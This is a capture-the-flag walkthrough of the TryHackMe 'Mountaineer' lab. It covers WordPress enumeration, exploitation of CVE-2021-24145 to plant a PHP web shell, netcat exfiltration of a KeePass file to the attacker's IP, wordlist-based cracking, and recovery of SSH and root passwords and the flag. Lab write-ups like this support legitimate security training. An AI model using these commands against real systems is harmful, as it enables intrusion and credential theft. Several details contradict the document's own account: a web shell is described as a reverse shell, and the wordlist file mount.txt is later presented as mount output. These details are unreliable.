TryHackMe | Mountaineer - A Detailed Penetration Test Walkthrough

This repository contains a detailed write-up of the steps taken to successfully compromise the "Mountaineer" machine on TryHackMe, a lab designated as "Hard." This walkthrough emphasizes a methodical approach to penetration testing, focusing on vulnerability identification, exploitation, and privilege escalation.
🔥 Lab Overview

The "Mountaineer" lab presents a challenging scenario designed to enhance penetration testing skills. While alternative easier paths might exist, this write-up outlines a comprehensive, "long road" approach to maximize learning.
🔍 Reconnaissance and Initial Enumeration

## The penetration test began with a comprehensive Nmap scan to identify open ports and services running on the target machine (10.10.245.243).

    nmap -sC -sV 10.10.245.243
    
    Here's the output of the Nmap scan:
    
    # nmap_scan.txt content
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 86:09:80:28:d4:ec:f1:f9:bc:a3:f7:bb:cc:0f:68:90 (ECDSA)
    |_  256 82:5a:2d:0c:77:83:7c:ea:ae:49:37:db:03:5a:03:08 (ED256)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Welcome to nginx!
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel





The scan revealed:

    Port 22 (SSH): Running OpenSSH 8.9p1 Ubuntu 3ubuntu0.6.

    Port 80 (HTTP):: Running Nginx 1.18.0 (Ubuntu) with the title "Welcome to nginx!". This indicated a web server, highly likely hosting a WordPress instance.

## 📂 Hosts File Update

To properly resolve the target domain, mountaineer.thm was added to the /etc/hosts file on the Kali Linux machine with root permissions.

    sudo nano /etc/hosts

Add the following line:

    10.10.245.243 mountaineer.thm

## 🔐 WordPress Vulnerability Scan

Given the presence of a web server and the lab's context, WPScan was used to identify vulnerabilities in the WordPress installation.

    wpscan --url http://mountaineer.thm/wordpress/ -e ap,vt,tt,cb,dbe,u,m

The output of WPScan (fuzz1.txt) highlighted a critical finding:

    # fuzz1.txt content snippet
    [+] modern-events-calendar-lite
     | Location: http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/
     | Last Updated: 2022-05-10T21:06:00.000Z
     | [!] The version is out of date, the latest version is 6.5.6
     |
     | Found By: Urls In Homepage (Passive Detection)
     |
     | Version: 5.16.2 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/readme.txt
     | Confirmed By: Change Log (Aggressive Detection)
     |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/changelog.txt, Match: '5.16.2'

The modern-events-calendar-lite plugin was significantly outdated (version 5.16.2 compared to 6.5.6), indicating a high probability of exploitable vulnerabilities.

## 🔍 Directory Search

    gobuster dir -u http://mountaineer.thm/wordpress/ -w directory-list-2.3-small.txt 
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://mountaineer.thm/wordpress/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                directory-list-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /images               (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/images/]
    /wp-content           (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-content/]
    /wp-includes          (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-includes/]
    /wp-admin             (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-admin/]
    Progress: 87664 / 87665 (100.00%)
    ===============================================================
    Finished
    ===============================================================

A simple directory search was conducted within the WordPress directory, though specific findings from this step were not detailed.

## 📂 Hosts Update for Admin Access

Another entry, adminroundcubemail.thm, was added to the /etc/hosts file. This suggested the discovery of another web service, likely a Roundcube webmail interface.

    sudo nano /etc/hosts

Add the following line:

    10.10.245.243 adminroundcubemail.thm

This is confirmed by new_dns.png:

## 🔑 WordPress Login

Initially, k2:k2 was used to bypass potential brute-force protections for the WordPress login panel at /wp-admin. However, further enumeration through emails (detailed in "Generating Password Lists" below) revealed the actual compromised password for the k2 user.

## 🔐 Logging in as k2 User

Using the compromised credentials (username=k2 and password=th3_tall3st_password_in_th3_world), we successfully logged into the WordPress administrator dashboard at http://mountaineer.thm/wordpress/wp-admin/.
## 🛠️ Exploring WordPress Plugins & Exploitation

With authenticated access, the outdated modern-events-calendar-lite plugin (version 5.16.2) was targeted. A publicly available exploit from Exploit-DB, specifically exploit.py (CVE-2021-24145), was used to gain remote code execution.

Exploit Details (CVE-2021-24145):
The exploit.py script targets an authenticated arbitrary file upload vulnerability in the Modern Events Calendar Lite WordPress plugin, versions before 5.16.5. This vulnerability allows an authenticated administrator to upload arbitrary PHP files by manipulating the Content-Type header to text/csv during an import operation. The exploit.py script automates the login and file upload process.
## 🔄 Setting Up Reverse Shell

The exploit.py script was used to upload a PHP reverse shell to the WordPress instance:

Then, the exploit.py script was executed with the now-known credentials for the k2 user:

    python3 exploit.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p th3_tall3st_password_in_th3_world

The script uploaded a p0wny-shell (as included in its body payload) to the WordPress server. The script then provided a link indicating the shell's location:

    [+] Shell Uploaded to: http://mountaineer.thm/wordpress//wp-content/uploads/shell.php

Upon navigating to this link in a web browser, the p0wny-shell was triggered, establishing a reverse shell connection to the netcat listener, thus providing initial access to the system.

## 🖥️ Searching through the Machine

Once inside, comprehensive manual enumeration was performed to understand the system's layout, user privileges, and potential misconfigurations. This involved exploring directories, checking file permissions, and looking for sensitive files.

## 🗄️ Finding Interesting Files

During the manual enumeration phase, a highly interesting file was discovered: Backup.kdbx. This file typically signifies a KeePass password database, which could contain critical credentials.

## 🛠️ Transferring the Backup.kdbx File

To analyze the Backup.kdbx file, it was transferred from the target machine to the Kali Linux system using netcat.

On the Kali Linux machine (local listener):

    nc -lvnp 444 > Backup.kdbx

On the compromised web server (sending the file):

    nc 10.6.48.108 444 < Backup.kdbx

## 📜 Generating Password Lists

To crack the Backup.kdbx file, a custom password list was generated using cupp -i. Information gleaned from emails (accessed via the adminroundcubemail.thm interface) was crucial for creating a targeted dictionary. This is also where the th3_tall3st_password_in_th3_world password for the k2 user was discovered, allowing for direct login to the WordPress admin panel.
    
    The following configuration was used for cupp -i:
    
    $ cupp -i
    
    [+] Insert the information about the victim to make a dictionary
    [+] If you don't know all the info, just hit enter when asked! ;)
    
    > First Name: Mount
    > Surname: Lhotse
    
    > Nickname: MrSecurity
    > Birthdate (DDMMYYYY): 18051956
    
    > Partners's name:
    > Partners's nickname:
    
    > Partners's birthdate (DDMMYYYY):
    
    > Child's name:
    > Child's nickname:
    
    > Child's birthdate (DDMMYYYY):
    
    > Pet's name: Lhotsy
    > Company name: BestMountainsInc
    
    Do you want to add some key words about the victim? Y/[N]: n
    > Do you want to add special chars at the end of words? Y/[N]: y
    >
    > Do you want to add some random numbers at the end of words? Y/[N]: y
    > Leet mode? (i.e. leet 1337) Y/[N]: y
    
    [+] Now making a dictionary...
    [+] Sorting list and removing duplicates....
    
    [+] Saving dictionary to mount.txt, counting 11190 words.
    [+] Now load your pistolero withstand shoot! Good luck!


## 🔓 Cracking the Backup.kdbx File

The Backup.kdbx file was cracked using John the Ripper. First, keepass2john was used to extract the hash from the KeePass database:

    keepass2john Backup.kdbx > keepass_hash

Then, John the Ripper was used with the generated wordlist (mount.txt) to crack the hash:

    john keepass_hash --wordlist=mount.txt

## 🔑 Password Found for kdbx File

Once the password was recovered, kpcli was used to open and inspect the contents of the .kdbx file, revealing stored credentials.

    kpcli --kdb Backup.kdbx
    
    After providing the master password, the following output was observed: Password= “Lhotse56185”
    
    Provide the master password: *************************
    
    KeePass CLI (kpcli) v3.8.1 is ready for operation.
    Type 'help' for a description of available commands.
    Type 'help <command>' for details on individual commands.
    
    kpcli:/> ls
    === Groups ===
    wordpress-backup/
    kpcli:/> cd wordpress-backup/
    kpcli:/wordpress-backup> ls
    === Groups ===
    eMail/
    General/
    Homebanking/
    Internet/
    Network/
    Windows/
    === Entries ===
    0. European Mountain                                                        
    1. Sample Entry                                    keepass.info
    2. Sample Entry #2                       keepass.info/help/kb/testform.
    3. The "Security-Mindedness" mountain                                      
    kpcli:/wordpress-backup> show -f 3
    
    Title: The "Security-Mindedness" mountain
    Uname: kangchenjunga
     Pass: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
     URL: 
    Notes: 

The KeePass database revealed an entry titled "The "Security-Mindedness" mountain" with the following credentials:

    Username: kangchenjunga

    Password: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV

## 🔑 SSH Access

The .kdbx file contained SSH credentials (kangchenjunga:J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV), which allowed for a more stable and interactive shell session.

    ssh kangchenjunga@10.10.245.243

## 📂 Analyzing Bash History & Root Access

Upon gaining SSH access as kangchenjunga, a critical step for privilege escalation was to examine the .bash_history file in the user's home directory. This file often contains sensitive information, including command line inputs with passwords. In this case, the root password was discovered within .bash_history.

    kangchenjunga@mountaineer:~$ cat .bash_history
    ls
    cd /var/www/html
    nano index.html
    cat /etc/passwd
    ps aux
    suroot
    th3_r00t_of_4LL_mount41NSSSSssssss  # <-- Root password found here!
    whoami
    ls -la
    cd /root
    ls
    mkdir test
    cd test
    touch file1.txt
    mv file1.txt ../
    cd ..
    rm -rf test
    exit
    ls
    cat mynotes.txt 
    ls
    cat .bash_history 
    cat .bash_history 
    ls -la
    cat .bash_history
    exit
    bash
    exit
    
    
The password th3_r00t_of_4LL_mount41NSSSSssssss was found, which allowed for direct su - root access.

    kangchenjunga@mountaineer:~$ su - root
    Password: 
    root@mountaineer:~# ls
    note.txt  root.txt  snap
    root@mountaineer:~# cat root.txt 
    a41824310a621855d9ed507f29eed757
    root@mountaineer:~# Connection to mountaineer.thm closed by remote host.
    Connection to mountaineer.thm closed.

## With the root password th3_r00t_of_4LL_mount41NSSSSssssss, complete control over the Mountaineer machine was achieved, and the root.txt flag (a41824310a621855d9ed507f29eed757) was successfully retrieved.

The mount.txt file, while not directly related to .bash_history in this context, might contain other interesting data points, such as mounted filesystems or other system-level information that could be useful in a broader pen-testing scenario.

# mount.txt content snippet
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=4096k,nr_inodes=1028751,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620)
tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=822604k,mode=755)
/dev/sdb1 on /mnt/data type ext4 (rw,relatime)




